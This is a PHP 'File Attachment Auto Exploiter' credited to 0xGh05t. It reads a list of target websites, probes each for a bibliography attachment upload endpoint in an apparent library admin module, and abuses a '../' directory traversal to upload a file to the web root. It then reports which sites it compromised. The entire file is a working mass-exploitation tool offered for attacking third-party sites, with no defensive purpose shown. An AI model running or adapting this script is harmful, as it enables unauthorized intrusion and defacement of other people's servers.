<?php
/*
# 0xGh05t
# Our Security Forum : notfound
# Facebook : facebook.com/ananta.an.37
 
# Your list.txt must a single directory with this exploiter #
 
# Special thanks : Security Darknet
#################################################
# note : Please do not remove Security Darknet copyright.
 
 
# This Exploit Coded By 0xGh05t
*/
echo "

      File Attachment Auto Exploiter - coded by 0xGh05t
 
     $ Thanks for All Indonesian Hacker & Security Darknet
 
";
echo "Input your target list: ";
$list = trim(fgets(STDIN));
 
$shell = "changelog.txt";
$exploit = "/admin/modules/bibliography/pop_attach.php?biblioID=0";
 
$open = fopen("$list","r");
$size = filesize("$list");
$read = fread($open,$size);
$lists = explode("\r\n",$read);
 
echo "\n";
 
foreach($lists as $target){
    if(!preg_match("/^http:\/\//",$target) AND !preg_match("/^https:\/\//",$target)){
        $targets = "http://$target";
    }else{
        $targets = $target;
    }
   
    echo "Target => $targets\n";
    echo "  [*] Checking Path : ";
 
    $cd = curl_init("$targets$exploit");
    curl_setopt($cd, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($cd, CURLOPT_RETURNTRANSFER, 1);
    curl_exec($cd);
    $httpcode = curl_getinfo($cd, CURLINFO_HTTP_CODE);
    curl_close($cd);
   
    if($httpcode == 200){
        echo "200 OK\n";
        echo "  [*] Uploading shell : ";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "$targets/$exploit");
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, array("fileTitle"=>"CyBeRiZM" , "fileDir"=>"../" , "file2attach"=>"@$shell" , "upload"=>"Unggah Sekarang"));
        curl_exec($ch);
       
        $cek = curl_init();
        curl_setopt($cek, CURLOPT_URL, "$targets/$shell");
        curl_setopt($cek, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($cek, CURLOPT_RETURNTRANSFER, 1);
        $ceek = curl_exec($cek);
        $ceeks = curl_getinfo($cek, CURLINFO_HTTP_CODE);
       
        if(preg_match("/hacked/",$ceek) or $ceeks == 200){
            echo "OK $targets/$shell\n";
        }else{
            echo "Failed\n\n";
        }
    }else{
        echo "Not Vulnerable\n\n";
    }
}
